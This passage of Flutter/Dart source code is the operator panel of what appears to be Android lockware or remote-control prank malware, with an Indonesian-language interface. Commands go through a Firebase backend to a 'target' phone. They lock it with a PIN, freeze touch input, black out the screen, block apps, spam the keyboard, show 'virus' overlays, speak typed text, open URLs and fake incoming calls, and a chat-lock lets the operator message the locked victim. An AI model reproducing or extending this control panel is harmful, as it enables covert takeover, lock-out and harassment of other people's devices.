          ts: (m['ts'] as num?)?.toInt() ?? 0,
        ));
      });
      list.sort((a, b) => a.ts.compareTo(b.ts));

      if (!mounted) return;
      final hasNew = list.length != _chatMsgs.length;
      setState(() => _chatMsgs = list);

      if (hasNew) {
        Future.delayed(const Duration(milliseconds: 100), () {
          if (_chatScrollCtrl.hasClients) {
            _chatScrollCtrl.animateTo(
              _chatScrollCtrl.position.maxScrollExtent,
              duration: const Duration(milliseconds: 250),
              curve: Curves.easeOut,
            );
          }
        });
      }
    } catch (_) {}
  }

  Future<void> _sendChatMessage() async {
    final text = _chatCtrl.text.trim();
    if (text.isEmpty) return;

    final id = 'msg_${DateTime.now().millisecondsSinceEpoch}_'
        '${Random().nextInt(99999)}';

    try {
      final res = await http.put(
        Uri.parse(
          '$kFirebaseUrl/devices/${widget.deviceId}/chat_lock/$id.json',
        ),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'sender': 'admin',
          'text': text,
          'ts': DateTime.now().millisecondsSinceEpoch,
        }),
      );

      if (res.statusCode == 200 || res.statusCode == 204) {
        _chatCtrl.clear();
        await _sendCommand('chat_lock_notify', {'msg': text, 'id': id});
      }
    } catch (e) {
      _showSnack('Gagal kirim chat', error: true);
    }
  }

  Widget _buildChatSheet() {
    return Padding(
      padding: EdgeInsets.only(
        bottom: MediaQuery.of(context).viewInsets.bottom,
      ),
      child: Container(
        height: MediaQuery.of(context).size.height * 0.7,
        decoration: const BoxDecoration(
          color: ControlHx.surfaceHi,
          borderRadius: BorderRadius.vertical(top: Radius.circular(22)),
        ),
        child: Column(
          children: [
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                border: Border(
                  bottom: BorderSide(
                    color: ControlHx.pink.withOpacity(0.25),
                    width: 1,
                  ),
                ),
              ),
              child: Row(
                children: [
                  Container(
                    width: 40, height: 40,
                    decoration: BoxDecoration(
                      color: ControlHx.pink.withOpacity(0.15),
                      borderRadius: BorderRadius.circular(10),
                      border: Border.all(
                        color: ControlHx.pink.withOpacity(0.4),
                        width: 1,
                      ),
                      boxShadow: [
                        BoxShadow(
                          color: ControlHx.pink.withOpacity(0.3),
                          blurRadius: 10,
                          spreadRadius: 1,
                        ),
                      ],
                    ),
                    child: const Icon(
                      Icons.chat_bubble_rounded,
                      color: ControlHx.pinkLight,
                      size: 18,
                    ),
                  ),
                  const SizedBox(width: 12),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          _device?.name ?? 'Target',
                          style: const TextStyle(
                            color: ControlHx.ivory,
                            fontFamily: kFontFamily,
                            fontSize: 13.5,
                            fontWeight: FontWeight.w900,
                          ),
                        ),
                        const SizedBox(height: 2),
                        Row(
                          children: [
                            Container(
                              width: 6, height: 6,
                              decoration: BoxDecoration(
                                color: ControlHx.jade,
                                shape: BoxShape.circle,
                                boxShadow: [
                                  BoxShadow(
                                    color: ControlHx.jade.withOpacity(0.8),
                                    blurRadius: 6,
                                    spreadRadius: 1,
                                  ),
                                ],
                              ),
                            ),
                            const SizedBox(width: 6),
                            const Text(
                              'Terhubung',
                              style: TextStyle(
                                color: ControlHx.ash,
                                fontFamily: kFontFamily,
                                fontSize: 10.5,
                              ),
                            ),
                          ],
                        ),
                      ],
                    ),
                  ),
                  IconButton(
                    onPressed: () => Navigator.pop(context),
                    icon: const Icon(
                      Icons.close_rounded,
                      color: ControlHx.pinkLight,
                      size: 20,
                    ),
                  ),
                ],
              ),
            ),
            Expanded(
              child: _chatMsgs.isEmpty
                  ? const Center(
                      child: Text(
                        'Belum ada pesan',
                        style: TextStyle(
                          color: ControlHx.ash2,
                          fontFamily: kFontFamily,
                          fontSize: 12,
                        ),
                      ),
                    )
                  : ListView.builder(
                      controller: _chatScrollCtrl,
                      padding: const EdgeInsets.all(16),
                      itemCount: _chatMsgs.length,
                      itemBuilder: (_, i) => _buildChatBubble(_chatMsgs[i]),
                    ),
            ),
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                border: Border(
                  top: BorderSide(
                    color: ControlHx.pink.withOpacity(0.25),
                    width: 1,
                  ),
                ),
              ),
              child: Row(
                children: [
                  Expanded(
                    child: Container(
                      decoration: BoxDecoration(
                        color: ControlHx.surfaceHi2,
                        borderRadius: BorderRadius.circular(20),
                        border: Border.all(
                          color: ControlHx.pink.withOpacity(0.25),
                          width: 1,
                        ),
                      ),
                      child: TextField(
                        controller: _chatCtrl,
                        style: const TextStyle(
                          color: ControlHx.ivory,
                          fontFamily: kFontFamily,
                          fontSize: 13,
                        ),
                        cursorColor: ControlHx.pink,
                        maxLines: 4,
                        minLines: 1,
                        onSubmitted: (_) => _sendChatMessage(),
                        decoration: const InputDecoration(
                          hintText: 'Tulis pesan...',
                          hintStyle: TextStyle(
                            color: ControlHx.ash2,
                            fontFamily: kFontFamily,
                            fontSize: 13,
                          ),
                          border: InputBorder.none,
                          contentPadding: EdgeInsets.symmetric(
                            horizontal: 14,
                            vertical: 10,
                          ),
                        ),
                      ),
                    ),
                  ),
                  const SizedBox(width: 10),
                  GestureDetector(
                    onTap: _sendChatMessage,
                    child: Container(
                      width: 42, height: 42,
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        gradient: const LinearGradient(
                          colors: [ControlHx.pinkLight, ControlHx.pinkDeep],
                          begin: Alignment.topLeft,
                          end: Alignment.bottomRight,
                        ),
                        boxShadow: [
                          BoxShadow(
                            color: ControlHx.pink.withOpacity(0.6),
                            blurRadius: 12,
                            spreadRadius: 1,
                          ),
                        ],
                      ),
                      child: const Icon(
                        Icons.send_rounded,
                        color: Colors.white,
                        size: 18,
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildChatBubble(ChatMsg m) {
    final isMine = m.sender == 'admin';
    final time = DateTime.fromMillisecondsSinceEpoch(m.ts);
    final timeStr =
        '${time.hour.toString().padLeft(2, '0')}:${time.minute.toString().padLeft(2, '0')}';

    return Align(
      alignment: isMine ? Alignment.centerRight : Alignment.centerLeft,
      child: Container(
        margin: const EdgeInsets.only(bottom: 8),
        constraints: BoxConstraints(
          maxWidth: MediaQuery.of(context).size.width * 0.7,
        ),
        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
        decoration: BoxDecoration(
          color: isMine
              ? ControlHx.pink.withOpacity(0.15)
              : ControlHx.surfaceHi2,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(
            color: isMine
                ? ControlHx.pink.withOpacity(0.5)
                : ControlHx.pink.withOpacity(0.2),
            width: 1,
          ),
          boxShadow: isMine
              ? [
                  BoxShadow(
                    color: ControlHx.pink.withOpacity(0.2),
                    blurRadius: 8,
                    spreadRadius: 1,
                  ),
                ]
              : null,
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(
              m.text,
              style: const TextStyle(
                color: ControlHx.ivory,
                fontFamily: kFontFamily,
                fontSize: 12.5,
                height: 1.4,
              ),
            ),
            const SizedBox(height: 4),
            Text(
              timeStr,
              style: const TextStyle(
                color: ControlHx.ash2,
                fontFamily: kFontFamily,
                fontSize: 9.5,
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════
  // BUILD
  // ═══════════════════════════════════════════════════════════
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: ControlHx.bg,
      extendBodyBehindAppBar: true,
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        scrolledUnderElevation: 0,
        leading: Padding(
          padding: const EdgeInsets.only(left: 8),
          child: Material(
            color: Colors.transparent,
            child: InkWell(
              onTap: () => Navigator.pop(context),
              borderRadius: BorderRadius.circular(12),
              child: Container(
                decoration: BoxDecoration(
                  color: ControlHx.surfaceHi,
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(
                    color: ControlHx.pink.withOpacity(0.3),
                    width: 1,
                  ),
                ),
                child: const Icon(
                  Icons.arrow_back_ios_new_rounded,
                  color: ControlHx.pinkLight,
                  size: 16,
                ),
              ),
            ),
          ),
        ),
        title: Row(
          mainAxisSize: MainAxisSize.min,
          children: const [
            Text(
              'Device ',
              style: TextStyle(
                color: ControlHx.ivory,
                fontFamily: kFontFamily,
                fontSize: 16,
                fontWeight: FontWeight.w900,
                letterSpacing: 0.6,
              ),
            ),
            Text(
              'Control',
              style: TextStyle(
                color: ControlHx.pinkLight,
                fontFamily: kFontFamily,
                fontSize: 16,
                fontWeight: FontWeight.w900,
                letterSpacing: 0.6,
              ),
            ),
          ],
        ),
        centerTitle: true,
        actions: [
          Padding(
            padding: const EdgeInsets.only(right: 8),
            child: Material(
              color: Colors.transparent,
              child: InkWell(
                onTap: () {
                  HapticFeedback.mediumImpact();
                  _refreshDevice();
                  _showSnack('Refresh');
                },
                borderRadius: BorderRadius.circular(12),
                child: Container(
                  width: 40, height: 40,
                  decoration: BoxDecoration(
                    color: ControlHx.surfaceHi,
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(
                      color: ControlHx.pink.withOpacity(0.3),
                      width: 1,
                    ),
                  ),
                  child: const Icon(
                    Icons.refresh_rounded,
                    color: ControlHx.pinkLight,
                    size: 18,
                  ),
                ),
              ),
            ),
          ),
        ],
      ),
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [Color(0xFF1A0E14), Color(0xFF241318)],
          ),
        ),
        child: SafeArea(
          child: _isLoading
              ? const Center(
                  child: CircularProgressIndicator(
                    color: ControlHx.pinkLight,
                    strokeWidth: 2.0,
                  ),
                )
              : ListView(
                  padding: const EdgeInsets.fromLTRB(16, 8, 16, 40),
                  physics: const BouncingScrollPhysics(),
                  children: [
                    _buildDeviceHero(),
                    const SizedBox(height: 20),
                    _buildSection('Kunci Layar', [
                      _actionCard('lock', 'Lock',
                          'Kunci device dengan PIN + pesan',
                          Icons.lock_rounded, ControlHx.pinkLight),
                      _actionCard('unlock', 'Unlock',
                          'Buka kunci device',
                          Icons.lock_open_rounded, ControlHx.jade),
                      _actionCard('custom_lock', 'Custom Lock',
                          'Kunci otomatis dalam durasi tertentu',
                          Icons.timer_rounded, ControlHx.pink),
                      _actionCard('custom_lock_html', 'HTML Lock',
                          'Custom tampilan HTML lock screen',
                          Icons.code_rounded, ControlHx.cyan),
                    ]),
                    _buildSection('Layar LCD', [
                      _actionCard('lcd_on', 'LCD ON',
                          'Muncul 4 garis hijau + overlay',
                          Icons.monitor_rounded, ControlHx.cyan),
                      _actionCard('lcd_off', 'LCD OFF',
                          'Matikan efek LCD',
                          Icons.monitor_rounded, ControlHx.jade),
                    ]),
                    _buildSection('Chat Lock', [
                      _actionCard('chat_lock_on', 'Chat Lock ON',
                          'Kunci device dengan dialog chat',
                          Icons.chat_bubble_rounded, ControlHx.cyan),
                      _actionCard('chat_lock_off', 'Chat Lock OFF',
                          'Hentikan chat lock di target',
                          Icons.chat_bubble_outline_rounded, ControlHx.jade),
                    ]),
                    _buildSection('Block App', [
                      _actionCard('block_app', 'Block App',
                          'Masukkan package name app target',
                          Icons.block_rounded, ControlHx.terra),
                      _actionCard('unblock_all', 'Unblock All',
                          'Hapus semua app yang diblok',
                          Icons.check_circle_rounded, ControlHx.jade),
                    ]),
                    _buildSection('Suara Target (TTS)', [
                      _actionCard('tts', 'Text to Speech',
                          'Target bakal ngomong teks yang kamu ketik',
                          Icons.record_voice_over_rounded, ControlHx.cyan),
                    ]),
                    _buildSection('Overlay', [
                      _actionCard('freeze_on', 'Freeze ON',
                          'Bekukan sentuhan di layar target',
                          Icons.pause_circle_rounded, ControlHx.amber),
                      _actionCard('freeze_off', 'Freeze OFF',
                          'Matikan freeze',
                          Icons.play_circle_rounded, ControlHx.jade),
                      _actionCard('blank_on', 'Blank ON',
                          'Layar jadi hitam total',
                          Icons.dark_mode_rounded, ControlHx.pink),
                      _actionCard('blank_off', 'Blank OFF',
                          'Matikan overlay hitam',
                          Icons.light_mode_rounded, ControlHx.jade),
                      _actionCard('ambacong_on', 'Ambacong ON',
                          'Tampilkan gambar lucu bergantian',
                          Icons.image_rounded, ControlHx.pink),
                      _actionCard('ambacong_off', 'Ambacong OFF',
                          'Matikan overlay ambacong',
                          Icons.image_not_supported_rounded, ControlHx.jade),
                      _actionCard('virus_amba_on', 'Virus Amba ON',
                          'Gambar virus makin banyak + sound',
                          Icons.coronavirus_rounded, ControlHx.terra),
                      _actionCard('virus_amba_off', 'Virus Amba OFF',
                          'Hentikan virus + sound',
                          Icons.healing_rounded, ControlHx.jade),
                      _actionCard('keyboard_on', 'Keyboard ON',
                          'Spam keyboard muncul terus',
                          Icons.keyboard_rounded, ControlHx.cyan),
                      _actionCard('keyboard_off', 'Keyboard OFF',
                          'Hentikan keyboard spam',
                          Icons.keyboard_hide_rounded, ControlHx.jade),
                      _actionCard('video_on', 'Video ON',
                          'Putar video fullscreen di target',
                          Icons.play_circle_fill_rounded, ControlHx.pink),
                      _actionCard('video_off', 'Video OFF',
                          'Hentikan video lock',
                          Icons.stop_circle_rounded, ControlHx.jade),
                    ]),
                    _buildSection('Flash Kamera', [
                      _actionCard('flash_on', 'Flash ON',
                          'Nyalakan flash kamera target',
                          Icons.flash_on_rounded, ControlHx.amber),
                      _actionCard('flash_off', 'Flash OFF',
                          'Matikan flash kamera',
                          Icons.flash_off_rounded, ControlHx.jade),
                      _actionCard('flash_blink', 'Flash Blink',
                          'Flash kedip-kedip terus',
                          Icons.flash_auto_rounded, ControlHx.amber),
                    ]),
                    _buildSection('Audio & Media', [
                      _actionCard('play_sound', 'Play Sound',
                          'Putar audio dari URL di target',
                          Icons.volume_up_rounded, ControlHx.cyan),
                      _actionCard('stop_sound', 'Stop Sound',
                          'Hentikan audio yang diputar',
                          Icons.volume_off_rounded, ControlHx.terra),
                      _actionCard('wallpaper', 'Set Wallpaper',
                          'Ganti wallpaper device target',
                          Icons.wallpaper_rounded, ControlHx.cyan),
                    ]),
                    _buildSection('Prank & Lainnya', [
                      _actionCard('prank_call', 'Prank Call',
                          'Simulasi panggilan masuk',
                          Icons.phone_rounded, ControlHx.terra),
                      _actionCard('open_url', 'Buka URL',
                          'Buka website di browser target',
                          Icons.link_rounded, ControlHx.pinkLight),
                      _actionCard('vibrate', 'Vibrate',
                          'Getarkan HP target',
                          Icons.vibration_rounded, ControlHx.amber),
                    ]),
                    const SizedBox(height: 20),
                    _buildDangerZone(),
                    const SizedBox(height: 20),
                    _buildLogList(),
                  ],
                ),
        ),
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════
  // HERO
  // ═══════════════════════════════════════════════════════════
  Widget _buildDeviceHero() {
    final d = _device;
    if (d == null) {
      return Container(
        padding: const EdgeInsets.all(20),
        decoration: BoxDecoration(
          color: ControlHx.surfaceHi,
          borderRadius: BorderRadius.circular(18),
          border: Border.all(
            color: ControlHx.terra.withOpacity(0.4),
            width: 1,
          ),
        ),
        child: const Text(
          'Device tidak ditemukan',
          style: TextStyle(
            color: ControlHx.terra,
            fontFamily: kFontFamily,
            fontSize: 14,
            fontWeight: FontWeight.w900,
          ),
        ),
      );
    }

    return Container(
      padding: const EdgeInsets.all(18),
      decoration: BoxDecoration(
        color: ControlHx.surfaceHi,
        borderRadius: BorderRadius.circular(18),
        border: Border.all(
          color: ControlHx.pink.withOpacity(0.3),
          width: 1,
        ),
        boxShadow: [
          BoxShadow(
            color: ControlHx.pink.withOpacity(0.15),
            blurRadius: 18,
            spreadRadius: 1,
            offset: const Offset(0, 6),
          ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          Row(
            children: [
              Container(
                width: 56, height: 56,
                decoration: BoxDecoration(
                  color: d.online
                      ? ControlHx.jade.withOpacity(0.15)
                      : ControlHx.pink.withOpacity(0.1),
                  borderRadius: BorderRadius.circular(14),
                  border: Border.all(
                    color: d.online
                        ? ControlHx.jade.withOpacity(0.5)
                        : ControlHx.pink.withOpacity(0.3),
                    width: 1,
                  ),
                  boxShadow: [
                    BoxShadow(
                      color: (d.online ? ControlHx.jade : ControlHx.pink).withOpacity(0.3),
                      blurRadius: 12,
                      spreadRadius: 1,
                    ),
                  ],
                ),
                child: Icon(
                  Icons.phone_iphone_rounded,
                  color: d.online ? ControlHx.jade : ControlHx.pinkLight,
                  size: 26,
                ),
              ),
              const SizedBox(width: 14),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      d.name,
                      overflow: TextOverflow.ellipsis,
                      style: const TextStyle(
                        color: ControlHx.ivory,
                        fontFamily: kFontFamily,
                        fontSize: 16,
                        fontWeight: FontWeight.w900,
                        letterSpacing: -0.3,
                      ),
                    ),
                    const SizedBox(height: 6),
                    Row(
                      children: [
                        Container(
                          padding: const EdgeInsets.symmetric(
                            horizontal: 8, vertical: 3,
                          ),
                          decoration: BoxDecoration(
                            color: d.online
                                ? ControlHx.jade.withOpacity(0.15)
                                : ControlHx.pink.withOpacity(0.1),
                            borderRadius: BorderRadius.circular(5),
                            border: Border.all(
                              color: d.online
                                  ? ControlHx.jade.withOpacity(0.5)
                                  : ControlHx.pink.withOpacity(0.3),
                              width: 1,
                            ),
                          ),
                          child: Text(
                            d.online ? 'ONLINE' : 'OFFLINE',
                            style: TextStyle(
                              color: d.online
                                  ? ControlHx.jade
                                  : ControlHx.pinkLight,
                              fontFamily: kFontFamily,
                              fontSize: 8.5,
                              fontWeight: FontWeight.w900,
                              letterSpacing: 1.2,
                            ),
                          ),
                        ),
                        const SizedBox(width: 6),
                        Container(
                          padding: const EdgeInsets.symmetric(
                            horizontal: 8, vertical: 3,
                          ),
                          decoration: BoxDecoration(
                            color: ControlHx.pink.withOpacity(0.1),
                            borderRadius: BorderRadius.circular(5),
                            border: Border.all(
                              color: ControlHx.pink.withOpacity(0.25),
                              width: 1,
                            ),
                          ),
                          child: Text(
                            'ID: ${d.id.length > 8 ? d.id.substring(d.id.length - 8) : d.id}',
                            style: const TextStyle(
                              color: ControlHx.pinkLight,
                              fontFamily: 'monospace',
                              fontSize: 8.5,
                              fontWeight: FontWeight.w700,
                            ),
                          ),
                        ),
                      ],
                    ),
                  ],
                ),
              ),
            ],
          ),
          const SizedBox(height: 16),
          Row(
            children: [
              _heroStat('BATERAI',
                  d.battery != null ? '${d.battery}%' : '—', ControlHx.pinkLight),
              const SizedBox(width: 8),
              _heroStat('NEGARA', d.country, ControlHx.jade),
              const SizedBox(width: 8),
              _heroStat('TERAKHIR', _timeAgo(d.lastSeen), ControlHx.amber),
            ],
          ),
        ],
      ),
    );
  }

  Widget _heroStat(String k, String v, Color color) {
    return Expanded(
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 12, horizontal: 8),
        decoration: BoxDecoration(
          color: ControlHx.surfaceHi2,
          borderRadius: BorderRadius.circular(10),
          border: Border.all(
            color: color.withOpacity(0.3),
            width: 1,
          ),
          boxShadow: [
            BoxShadow(
              color: color.withOpacity(0.15),
              blurRadius: 8,
              spreadRadius: 1,
            ),
          ],
        ),
        child: Column(
          children: [
            Text(
              v,
              overflow: TextOverflow.ellipsis,
              style: TextStyle(
                color: color,
                fontFamily: kFontFamily,
                fontSize: 15,
                fontWeight: FontWeight.w900,
                letterSpacing: -0.3,
              ),
            ),
            const SizedBox(height: 3),
            Text(
              k,
              style: const TextStyle(
                color: ControlHx.ash,
                fontFamily: kFontFamily,
                fontSize: 8.5,
                fontWeight: FontWeight.w900,
                letterSpacing: 1.2,
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════
  // SECTION
  // ═══════════════════════════════════════════════════════════
  Widget _buildSection(String title, List<Widget> children) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        Padding(
          padding: const EdgeInsets.only(top: 12, bottom: 10),
          child: Row(
            children: [
              const Icon(Icons.favorite_rounded,
                  color: ControlHx.pink, size: 12),
              const SizedBox(width: 8),
              Text(
                title.toUpperCase(),
                style: const TextStyle(
                  color: ControlHx.ivory,
                  fontFamily: kFontFamily,
                  fontSize: 10,
                  fontWeight: FontWeight.w900,
                  letterSpacing: 2.2,
                ),
              ),
              const SizedBox(width: 10),
              Expanded(
                child: Container(
                  height: 1,
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [
                        ControlHx.pink.withOpacity(0.5),
                        ControlHx.pink.withOpacity(0.0),
                      ],
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
        ...children,
      ],
    );
  }

  Widget _actionCard(
    String act,
    String title,
    String subtitle,
    IconData icon,
    Color color,
  ) {
    final disabled = _device == null || !_device!.online;

    return Material(
      color: Colors.transparent,
      child: InkWell(
        onTap: disabled ? null : () => _handleAction(act),
        borderRadius: BorderRadius.circular(16),
        child: Opacity(
          opacity: disabled ? 0.4 : 1.0,
          child: Container(
            margin: const EdgeInsets.only(bottom: 10),
            padding: const EdgeInsets.all(14),
            decoration: BoxDecoration(
              color: ControlHx.surfaceHi,
              borderRadius: BorderRadius.circular(16),
              border: Border.all(
                color: color.withOpacity(0.3),
                width: 1,
              ),
              boxShadow: [
                BoxShadow(
                  color: color.withOpacity(0.15),
                  blurRadius: 10,
                  spreadRadius: 1,
                  offset: const Offset(0, 4),
                ),
              ],
            ),
            child: Row(
              children: [
                Container(
                  width: 46, height: 46,
                  decoration: BoxDecoration(
                    color: color.withOpacity(0.18),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(
                      color: color.withOpacity(0.5),
                      width: 1,
                    ),
                    boxShadow: [
                      BoxShadow(
                        color: color.withOpacity(0.35),
                        blurRadius: 10,
                        spreadRadius: 1,
                      ),
                    ],
                  ),
                  child: Icon(icon, color: color, size: 20),
                ),
                const SizedBox(width: 14),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        title,
                        style: const TextStyle(
                          color: ControlHx.ivory,
                          fontFamily: kFontFamily,
                          fontSize: 13.5,
                          fontWeight: FontWeight.w900,
                          letterSpacing: 0.2,
                        ),
                      ),
                      const SizedBox(height: 4),
                      Text(
                        subtitle,
                        style: const TextStyle(
                          color: ControlHx.ash,
                          fontFamily: kFontFamily,
                          fontSize: 11,
                          height: 1.4,
                        ),
                      ),
                    ],
                  ),
                ),
                const Icon(
                  Icons.chevron_right_rounded,
                  color: ControlHx.pinkLight,
                  size: 22,
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════
  // DANGER ZONE
  // ═══════════════════════════════════════════════════════════
  Widget _buildDangerZone() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        Padding(
          padding: const EdgeInsets.only(top: 12, bottom: 10),
          child: Row(
            children: [
              const Icon(Icons.warning_rounded,
                  color: ControlHx.terra, size: 12),
              const SizedBox(width: 8),
              const Text(
                'DANGER ZONE',
                style: TextStyle(
                  color: ControlHx.terra,
                  fontFamily: kFontFamily,
                  fontSize: 10,
                  fontWeight: FontWeight.w900,
                  letterSpacing: 2.2,
                ),
              ),
              const SizedBox(width: 10),
              Expanded(
                child: Container(
                  height: 1,
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [
                        ControlHx.terra.withOpacity(0.5),
                        ControlHx.terra.withOpacity(0.0),
                      ],
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
        Container(
          padding: const EdgeInsets.all(14),
          decoration: BoxDecoration(
            color: ControlHx.terra.withOpacity(0.1),
            borderRadius: BorderRadius.circular(16),
            border: Border.all(
              color: ControlHx.terra.withOpacity(0.4),
              width: 1,
            ),
            boxShadow: [
              BoxShadow(
                color: ControlHx.terra.withOpacity(0.15),
                blurRadius: 12,
                spreadRadius: 1,
              ),
            ],
          ),
          child: Row(
            children: [
              Container(
                width: 42, height: 42,
                decoration: BoxDecoration(
                  color: ControlHx.terra.withOpacity(0.2),
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(
                    color: ControlHx.terra.withOpacity(0.5),
                    width: 1,
                  ),
                  boxShadow: [
                    BoxShadow(
                      color: ControlHx.terra.withOpacity(0.35),
                      blurRadius: 10,
                      spreadRadius: 1,
                    ),
                  ],
                ),
                child: const Icon(
                  Icons.warning_rounded,
                  color: ControlHx.terra,
                  size: 20,
                ),
              ),
              const SizedBox(width: 12),
              const Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      'Emergency Stop',
                      style: TextStyle(
                        color: ControlHx.ivory,
                        fontFamily: kFontFamily,
                        fontSize: 13,
                        fontWeight: FontWeight.w900,
                      ),
                    ),
                    SizedBox(height: 3),
                    Text(
                      'Matikan semua overlay sekaligus',
                      style: TextStyle(
                        color: ControlHx.ash,
                        fontFamily: kFontFamily,
                        fontSize: 11,
                      ),
                    ),
                  ],
                ),
              ),
              TextButton(
                onPressed: _device?.online == true
                    ? _triggerEmergencyStop
                    : null,
                style: TextButton.styleFrom(
                  padding: const EdgeInsets.symmetric(
                    horizontal: 14, vertical: 10,
                  ),
                  backgroundColor: ControlHx.terra.withOpacity(0.15),
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(10),
                    side: BorderSide(
                      color: ControlHx.terra.withOpacity(0.5),
                      width: 1,
                    ),
                  ),
                ),
                child: const Text(
                  'STOP',
                  style: TextStyle(
                    color: ControlHx.terra,
                    fontFamily: kFontFamily,
                    fontSize: 11,
                    fontWeight: FontWeight.w900,
                    letterSpacing: 1.4,
                  ),
                ),
              ),
            ],
          ),
        ),
      ],
    );
  }

  Future<void> _triggerEmergencyStop() async {
    final ok = await _confirmDialog(
      title: 'Emergency Stop?',
      message: 'Matikan semua overlay & sound aktif di device target.',
      confirmLabel: 'STOP ALL',
      confirmColor: ControlHx.terra,
    );
    if (ok != true) return;

    _showSnack('Emergency stop...');

    final cmds = [
      'unlock',
      'freeze_off',
      'blank_off',
      'ambacong_off',
      'virus_amba_off',
      'keyboard_off',
      'video_off',
      'flash_off',
      'stop_sound',
      'prank_end',
      'chat_lock_off',
      'unblock_all',
      'tts_stop',
      'lcd_off',
    ];

    for (final c in cmds) {
      await _sendCommand(c);
      await Future.delayed(const Duration(milliseconds: 120));
    }

    _stopChatPolling();
    _showSnack('Stop all ✓', success: true);
  }

  // ═══════════════════════════════════════════════════════════
  // LOG LIST
  // ═══════════════════════════════════════════════════════════
  Widget _buildLogList() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        Padding(
          padding: const EdgeInsets.only(top: 12, bottom: 10),
          child: Row(
            children: [
              const Icon(Icons.favorite_rounded,
                  color: ControlHx.pink, size: 12),
              const SizedBox(width: 8),
              const Text(
                'LOG PERINTAH',
                style: TextStyle(
                  color: ControlHx.ivory,
                  fontFamily: kFontFamily,
                  fontSize: 10,
                  fontWeight: FontWeight.w900,
                  letterSpacing: 2.2,
                ),
              ),
              const SizedBox(width: 10),
              Expanded(
                child: Container(
                  height: 1,
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [
                        ControlHx.pink.withOpacity(0.5),
                        ControlHx.pink.withOpacity(0.0),
                      ],
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
        if (_logs.isEmpty)
          Container(
            padding: const EdgeInsets.all(22),
            decoration: BoxDecoration(
              color: ControlHx.surfaceHi,
              borderRadius: BorderRadius.circular(14),
              border: Border.all(
                color: ControlHx.pink.withOpacity(0.2),
                width: 1,
              ),
            ),
            child: const Center(
              child: Text(
                'Belum ada perintah dikirim',
                style: TextStyle(
                  color: ControlHx.ash2,
                  fontFamily: kFontFamily,
                  fontSize: 11.5,
                ),
              ),
            ),
          )
        else
          ..._logs.map((l) {
            final t = DateTime.fromMillisecondsSinceEpoch(l.ts);
            final time =
                '${t.hour.toString().padLeft(2, '0')}:${t.minute.toString().padLeft(2, '0')}';
            return Container(
              margin: const EdgeInsets.only(bottom: 6),
              padding: const EdgeInsets.symmetric(
                horizontal: 14, vertical: 11,
              ),
              decoration: BoxDecoration(
                color: ControlHx.surfaceHi,
                borderRadius: BorderRadius.circular(10),
                border: Border.all(
                  color: l.ok
                      ? ControlHx.jade.withOpacity(0.3)
                      : ControlHx.terra.withOpacity(0.3),
                  width: 1,
                ),
              ),
              child: Row(
                children: [
                  Container(
                    width: 7, height: 7,
                    decoration: BoxDecoration(
                      color: l.ok ? ControlHx.jade : ControlHx.terra,
                      shape: BoxShape.circle,
                      boxShadow: [
                        BoxShadow(
                          color: (l.ok ? ControlHx.jade : ControlHx.terra).withOpacity(0.6),
                          blurRadius: 6,
                          spreadRadius: 1,
                        ),
                      ],
                    ),
                  ),
                  const SizedBox(width: 10),
                  Expanded(
                    child: RichText(
                      text: TextSpan(
                        style: const TextStyle(
                          color: ControlHx.ash,
                          fontFamily: kFontFamily,
                          fontSize: 11.5,
                        ),
                        children: [
                          TextSpan(
                            text: l.action,
                            style: const TextStyle(
                              color: ControlHx.ivory,
                              fontWeight: FontWeight.w900,
                            ),
                          ),
                          TextSpan(
                            text: l.ok ? ' terkirim' : ' gagal',
                          ),
                        ],
                      ),
                    ),
                  ),
                  Text(
                    time,
                    style: const TextStyle(
                      color: ControlHx.ash2,
                      fontFamily: 'monospace',
                      fontSize: 10,
                    ),
                  ),
                ],
              ),
            );
          }),
      ],
    );
  }

  // ═══════════════════════════════════════════════════════════
  // CONFIRM DIALOG
  // ═══════════════════════════════════════════════════════════
  Future<bool?> _confirmDialog({
    required String title,
    required String message,
    required String confirmLabel,
    required Color confirmColor,
  }) {
    return showDialog<bool>(
      context: context,
      barrierColor: Colors.black.withOpacity(0.7),
      builder: (ctx) => Dialog(
        backgroundColor: Colors.transparent,
